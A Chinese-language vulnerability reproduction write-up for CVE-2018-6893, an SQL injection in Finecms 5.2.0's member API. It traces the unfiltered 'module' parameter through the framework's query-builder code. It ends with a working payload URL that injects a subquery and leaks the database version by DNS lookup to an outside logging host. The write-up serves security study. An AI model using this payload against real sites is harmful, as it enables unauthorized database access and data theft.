<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞</h1><h2>一、漏洞简介</h2><p>Finecms 5.2.0版本中的controllers/member/Api.php文件存在SQL注入漏洞，该漏洞源于程序没有进行有效的过滤。远程攻击者可利用该漏洞执行SQL命令。</p><h2>二、漏洞影响</h2><p>Finecms 5.2.0</p><h2>三、复现过程</h2><p>漏洞位置在：</p><p>finecms/dayrui/controllers/member/Api.php 590行左右</p><p>public function checktitle() {<br />    $id = (int)$this-&gt;input-&gt;get('id');<br />    $title = $this-&gt;input-&gt;get('title', TRUE);<br />    $module = $this-&gt;input-&gt;get('module');<br />    (!$title || !$module) &amp;&amp; exit('');<br />    $num = $this-&gt;db-&gt;where('id&lt;&gt;', $id)-&gt;where('title', $title)-&gt;count_all_results(SITE_ID.'_'.$module);<br />    $num ? exit(fc_lang('&lt;font color=red&gt;'.fc_lang('重复').'&lt;/font&gt;')) : exit('');<br />}</p><p>可以看到方法count_all_results()使用了$module,count_all_results()方法如下：</p><p>public function count_all_results($table = '', $reset = TRUE)<br />    {<br />        if ($table !== '')<br />        {<br />            $this-&gt;_track_aliases($table);<br />            $this-&gt;from($table);<br />        }<br /><br />        // ORDER BY usage is often problematic here (most notably<br />        // on Microsoft SQL Server) and ultimately unnecessary<br />        // for selecting COUNT(*) ...<br />        if ( ! empty($this-&gt;qb_orderby))<br />        {<br />            $orderby = $this-&gt;qb_orderby;<br />            $this-&gt;qb_orderby = NULL;<br />        }<br /><br />        $result = ($this-&gt;qb_distinct === TRUE OR ! empty($this-&gt;qb_groupby) OR ! empty($this-&gt;qb_cache_groupby) OR $this-&gt;qb_limit OR $this-&gt;qb_offset)<br />            ? $this-&gt;query($this-&gt;_count_string.$this-&gt;protect_identifiers('numrows').&quot;\nFROM (\n&quot;.$this-&gt;_compile_select().&quot;\n) CI_count_all_results&quot;)<br />            : $this-&gt;query($this-&gt;_compile_select($this-&gt;_count_string.$this-&gt;protect_identifiers('numrows')));<br /><br />        if ($reset === TRUE)<br />        {<br />            $this-&gt;_reset_select();<br />        }<br />        // If we've previously reset the qb_orderby values, get them back<br />        elseif ( ! isset($this-&gt;qb_orderby))<br />        {<br />            $this-&gt;qb_orderby = $orderby;<br />        }<br /><br />        if ($result-&gt;num_rows() === 0)<br />        {<br />            return 0;<br />        }<br /><br />        $row = $result-&gt;row();<br />        return (int) $row-&gt;numrows;<br />    }</p><p>可以看到对传入的table参数进行了是否为空校验以及经过两个函数的处理，再跟进_track_aliases函数继续进行分析：</p><p>protected function _track_aliases($table)<br />    {<br />        if (is_array($table))<br />        {<br />            foreach ($table as $t)<br />            {<br />                $this-&gt;_track_aliases($t);<br />            }<br />            return;<br />        }<br /><br />        // Does the string contain a comma?  If so, we need to separate<br />        // the string into discreet statements<br />        if (strpos($table, ',') !== FALSE)<br />        {<br />            return $this-&gt;_track_aliases(explode(',', $table));<br />        }<br /><br />        // if a table alias is used we can recognize it by a space<br />        if (strpos($table, ' ') !== FALSE)<br />        {<br />            // if the alias is written with the AS keyword, remove it<br />            $table = preg_replace('/\s+AS\s+/i', ' ', $table);<br /><br />            // Grab the alias<br />            $table = trim(strrchr($table, ' '));<br /><br />            // Store the alias, if it doesn't already exist<br />            if ( ! in_array($table, $this-&gt;qb_aliased_tables, TRUE))<br />            {<br />                $this-&gt;qb_aliased_tables[] = $table;<br />                if ($this-&gt;qb_caching === TRUE &amp;&amp; ! in_array($table, $this-&gt;qb_cache_aliased_tables, TRUE))<br />                {<br />                    $this-&gt;qb_cache_aliased_tables[] = $table;<br />                    $this-&gt;qb_cache_exists[] = 'aliased_tables';<br />                }<br />            }<br />        }<br />    }</p><p>可以看到table在这个函数中经过了较多过滤，继续看下一个函数from：</p><p>public function from($from)<br />    {<br />        foreach ((array) $from as $val)<br />        {<br />            if (strpos($val, ',') !== FALSE)<br />            {<br />                foreach (explode(',', $val) as $v)<br />                {<br />                    $v = trim($v);<br />                    $this-&gt;_track_aliases($v);<br />                    $this-&gt;qb_from[] = $v = $this-&gt;protect_identifiers($v, TRUE, NULL, FALSE);<br />                    if ($this-&gt;qb_caching === TRUE)<br />                    {<br />                        $this-&gt;qb_cache_from[] = $v;<br />                        $this-&gt;qb_cache_exists[] = 'from';<br />                    }<br />                }<br />            }<br />            else<br />            {<br />                $val = trim($val);<br />                // Extract any aliases that might exist. We use this information<br />                // in the protect_identifiers to know whether to add a table prefix<br />                $this-&gt;_track_aliases($val);<br />                $this-&gt;qb_from[] = $val = $this-&gt;protect_identifiers($val, TRUE, NULL, FALSE);<br />                if ($this-&gt;qb_caching === TRUE)<br />                {<br />                    $this-&gt;qb_cache_from[] = $val;<br />                    $this-&gt;qb_cache_exists[] = 'from';<br />                }<br />            }<br />        }<br />        return $this;<br />    }</p><p>可以看到经过这两个函数以及finecms本身get方法的过滤，能用的符号不多了，但是括号以及逗号都还能使用。</p><p>在测试的时候，如果传入的参数比如：module=1，则会爆表不存在的错误，并且可以看到查询的语句，而module参数位于from位置，也就是查询的表的位置，于是使用逗号分割查询的表，并使用dns外带数据</p><p>payload如下</p><p>http://0-sec.org/index.php?s=member&amp;c=api&amp;m=checktitle&amp;id=13&amp;title=123&amp;module=news,(select load_file(concat(0x5c5c5c5c,version(),0x2e6d7973716c2e61687a6935672e636579652e696f5c5c616263))) as total</p></body></html>